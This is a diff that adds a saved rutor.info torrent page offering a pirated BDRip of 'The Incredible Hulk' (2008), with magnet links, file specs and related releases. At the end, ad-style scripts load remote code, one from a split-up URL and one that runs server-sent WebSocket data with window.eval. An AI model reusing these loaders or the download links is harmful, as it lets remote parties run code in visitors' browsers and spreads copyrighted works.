@@ -1,0 +1,381 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Невероятный Халк / The Incredible Hulk (2008) BDRip от HQ-ViDEO | D</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Невероятный Халк / The Incredible Hulk (2008) BDRip от HQ-ViDEO | D</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:90cb588853b10f0eefc52d9ea7ecc31cde3b2941&amp;dn=rutor.info_%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BE%D1%8F%D1%82%D0%BD%D1%8B%D0%B9+%D0%A5%D0%B0%D0%BB%D0%BA+%2F+The+Incredible+Hulk+%282008%29+BDRip+%D0%BE%D1%82+HQ-ViDEO+%7C+D&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630508"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630508"><img src="http://s.rutor.info/t/down.png"> Скачать Neveroyatnyi.Halk.2008.DUAL.BDRip.XviD.AC3.-HQ-.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><font size="4"><b>Невероятный Халк / The Incredible Hulk (2008) BDRip<br />
+от <span style="color:blue;">HQ-ViDEO</span></b></font><br />
+<br />
+<img src="http://a.radikal.ru/a12/1805/1d/8630a7771087.jpg" /><br />
+<br />
+<font size="3"><span style="color:Blue;"><i><b>«В гневе он Вам не понравится!»</b></i></span></font><br />
+<br />
+<u>Информация о фильме</u><br />
+<b>Название: </b>Невероятный Халк<br />
+<b>Оригинальное название: </b>The Incredible Hulk<br />
+<b>Год выхода: </b>2008<br />
+<b>Жанр: </b> <a href="/tag/1/Фантастика" target="_blank">Фантастика</a>, <a href="/tag/1/Боевик" target="_blank">Боевик</a>, <a href="/tag/1/Триллер" target="_blank">Триллер</a><br />
+<b>Режиссер: </b>Луи Летерье<br />
+<b>В ролях: </b>Эдвард Нортон, Лив Тайлер, Тим Рот, Уильям Хёрт, Тим Блэйк Нельсон, Тай Буррелл, Кристина Сабот, Лу Ферриньо, Пол Соулз<br />
+<br />
+<b>О фильме: </b>История доктора Брюса Баннера, который ищет лекарство от своего необычного «заболевания», превращающего его во время эмоционального стресса в гигантского зеленого монстра Халка. Находясь в бегах от армии, стремящейся его захватить, Брюс почти находит лекарство, но все старания идут прахом, когда у Халка вдруг появляется новый, невероятно сильный противник.<br />
+<br />
+ <a href="http://www.imdb.com/title/tt0800080/" target="_blank"><img src="http://s.rutor.info/imdb/pic/0800080.gif" /></a> <a href="http://www.kinopoisk.ru/film/255380/" target="_blank"><img src="http://www.kinopoisk.ru/rating/255380.gif" /></a><br />
+<br />
+<b>Раздача от:</b> <a href="http://forum.hq-video.org/forum.php" target="_blank"><img src="http://s019.radikal.ru/i634/1606/81/92c2aa9d522b.gif" /></a><br />
+<b>Автор рипа:</b> <b><span style="color:darkorchid;">HRIME</span></b><br />
+<br />
+<b>Выпущено: </b>США | Marvel Enterprises, Marvel Studios Inc., Universal Pictures, Valhalla Motion Pictures<br />
+<b>Продолжительность: </b>01:52:14<br />
+<b>Перевод: </b><span style="color:blue;">Дублированный перевод (BD CEE)</span> + Оригинал (Английский) + <a href="https://drive.google.com/open?id=15w-Fy8EZcPJqTh3DNxDmNfioQLj6fdtV" target="_blank"><b>Профессиональный (многоголосый, закадровый) Kravec</b></a> + <a href="https://drive.google.com/open?id=18PQQGRHqzqllyZD5EHQGzySdxcNmz4t6" target="_blank"><b>Профессиональный (двухголосый, закадровый) Супербит</b></a> + <a href="https://drive.google.com/open?id=15fIdwwkbxKcdqD4j_3nVZOEunaQBEp1J" target="_blank"><b>Авторский (одноголосый, закадровый) А. Гаврилов</b></a> + <a href="https://drive.google.com/open?id=1E1kZ0xdMxW0wBQDPfrWq03DHqmHtr9H3" target="_blank"><b>Авторский (одноголосый, закадровый) В. Королев</b></a> + <a href="https://drive.google.com/open?id=15_9Fj6hdTxSBLfCD4gKmHGHpiRNQNDcf" target="_blank"><b>Украинский дублированный перевод</b></a><br />
+<b>Субтитры: </b><a href="https://drive.google.com/open?id=10VdGiZCTJ9-Ui6SnvRE-yad7wwsdQVPU" target="_blank"><b>Русские (полные, форсированные), Английские.</b></a><br />
+<br />
+<u>Файл:</u><br />
+<b>Формат: </b>AVI<br />
+<b>Качество: </b>BDRip (источник: <b>BD-Remux</b> - <b>Grimlen</b>)<br />
+<b>Кодек: </b>XviD, build 67 codec<br />
+<b>Видео: </b>720 x 304; 23.976 fps; 1870 kbps; 0.356 bit/pixel<br />
+<b>Аудио #1: </b>AC3 Dolby Digital; 448 Kbps; 6 channels; 48 KHz<br />
+<b>Аудио #2: </b>AC3 Dolby Digital; 448 Kbps; 6 channels; 48 KHz<br />
+<b>Аудио #3: </b>AC3 Dolby Digital; 448 Kbps; 6 channels; 48 KHz <b>(отдельно, http)</b><br />
+<b>Аудио #4: </b>AC3 Dolby Digital; 384 Kbps; 6 channels; 48 KHz <b>(отдельно, http)</b><br />
+<b>Аудио #5: </b>AC3 Dolby Digital; 448 Kbps; 6 channels; 48 KHz <b>(отдельно, http)</b><br />
+<b>Аудио #6: </b>AC3 Dolby Digital; 448 Kbps; 6 channels; 48 KHz <b>(отдельно, http)</b><br />
+<b>Аудио #7: </b>AC3 Dolby Digital; 192 Kbps; 2 channels; 48 KHz <b>(отдельно, http)</b><br />
+<b>Размер: </b>2234 Mb (1/2 DVD)<br />
+<b>Сэмпл: </b><a href="http://multi-up.com/1197576" target="_blank"><b>скачать</b></a><br />
+<br />
+<b>Скриншоты для оценки качества (превью - увеличение по клику):</b><br />
+<br />
+<a href="http://i6.imageban.ru/out/2018/05/08/63e23189385f3d83460747a4f0dcc008.png" target="_blank"><img src="http://i2.imageban.ru/out/2018/05/08/4a7e8680c909b8279bcaf52e814ecfc7.png" /></a>  <a href="http://i1.imageban.ru/out/2018/05/08/46adf617341deef1da55c9c01f7c1aac.png" target="_blank"><img src="http://i3.imageban.ru/out/2018/05/08/b33d1a8baa3478b351c3eb2996c6fc15.png" /></a><br />
+<a href="http://i3.imageban.ru/out/2018/05/08/433836d70a67b9509f4c64ae93a956c4.png" target="_blank"><img src="http://i1.imageban.ru/out/2018/05/08/bd337bb8e927ea5d70dd330349b5d77b.png" /></a>  <a href="http://i4.imageban.ru/out/2018/05/08/db71a928eba7b41c4c2148fca4c632c9.png" target="_blank"><img src="http://i6.imageban.ru/out/2018/05/08/d488adc5e1c5d1afa82e8c7c2b8beed0.png" /></a><br />
+<a href="http://i5.imageban.ru/out/2018/05/08/fc6170022cbe152496770a75a7f02201.png" target="_blank"><img src="http://i6.imageban.ru/out/2018/05/08/bbb11b3e33386aa99824abca59f66018.png" /></a>  <a href="http://i4.imageban.ru/out/2018/05/08/7ccbf1c9f8defd07afce6bea878dfadb.png" target="_blank"><img src="http://i3.imageban.ru/out/2018/05/08/af3c848a49fe722d9f829f29da1efd34.png" /></a><br />
+<br />
+<font size="3"><b>ПРИЯТНОГО ПРОСМОТРА!</b></font></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/1256700/0" target="_blank">Alex___007</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/kino" target="_blank">Зарубежные фильмы</a></td></tr>
+<tr><td class="header">Раздают</td><td>16</td></tr>
+<tr><td class="header">Качают</td><td>3</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (18 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 17:18:02  (15 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>2.18&nbsp;GB  (2343067648 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630508);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>07&nbsp;Апр&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/624706"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:0edc6c93f25fb350f373dd539ee369d8aa452b20&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/624706/neverojatnyj-halk_the-incredible-hulk-2008-bdrip-hevc-2160p-ot-mediaclub-4k-hdr-d-p-p2-a">Невероятный Халк / The Incredible Hulk (2008) BDRip-HEVC 2160p от MediaClub | 4K | HDR | D, P, P2, A </a></td> <td align="right">6<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">21.39&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;4</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>06&nbsp;Апр&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/624430"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:0becd98b53cf26c3b8654b78b51e4dba7d4557cb&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/624430/neverojatnyj-halk_the-incredible-hulk-2008-uhd-bdremux-2160p-ot-exkinoray-hdr-d-p-p2-a-licenzija">Невероятный Халк / The Incredible Hulk (2008) UHD BDRemux 2160p от ExKinoRay | HDR | D, P, P2, A | Лицензия </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">59.70&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>06&nbsp;Апр&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/624426"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:327236b6bfae6a8afbaba52dcd023b00b12f3e7a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/624426/neverojatnyj-halk_the-incredible-hulk-2008-uhd-blu-ray-eur-2160p-hdr-licenzija">Невероятный Халк / The Incredible Hulk (2008) UHD Blu-Ray EUR 2160p | HDR | Лицензия </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">57.62&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>25&nbsp;Окт&nbsp;15</td><td ><a class="downgif" href="http://d.rutor.info/download/465529"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:2de608b13ef92faaa158e1ebe210c425682a88c8&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/465529/neverojatnyj-halk_the-incredible-hulk-2008-bdrip-720r-ot-supermin-d">Невероятный Халк / The Incredible Hulk (2008) BDRip 720р от SuperMin | D </a></td> <td align="right">3<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">3.48&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;34</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>19&nbsp;Фев&nbsp;15</td><td ><a class="downgif" href="http://d.rutor.info/download/413284"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:50c838c92d1d735ec50c4d623ea1323496ce9226&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/413284/neverojatnyj-halk_the-incredible-hulk-2008-bdrip-avc-d-p-p2-a">Невероятный Халк / The Incredible Hulk (2008) BDRip-AVC | D, P, P2, A </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">3.12&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>21&nbsp;Сен&nbsp;13</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/305563"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:4b004c47315426257baaf16c638f0dfd66988211&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/305563/neverojatnyj-halk_the-incredible-hulk-2008-dvd9-p">Невероятный Халк / The Incredible Hulk (2008) DVD9 | P </a></td> 
+<td align="right">5.20&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>30&nbsp;Июн&nbsp;13</td><td ><a class="downgif" href="http://d.rutor.info/download/290768"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:f1b6727b6f44f202b888551eca2ddff690485d46&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/290768/neverojatnyj-halk_the-incredible-hulk-2008-hdrip-avc-r-a">Невероятный Халк / The Incredible Hulk (2008) HDRip-AVC | Р, А </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.48&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;55</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/1/0/0/The Incredible Hulk (2008)" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630508.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (1)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630508">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630508);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630508);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630508">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>oksanka-69</b></td> <td>08-05-2018 21:17:34 (11 час назад)</td> <td></td> <td align="right"><span id="c_3199562"></span><script type="text/javascript">cOptions(818856,3199562);</script></td></tr><tr><td class="c_t" colspan=4>а расширенная версия почти на час длиннее </td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
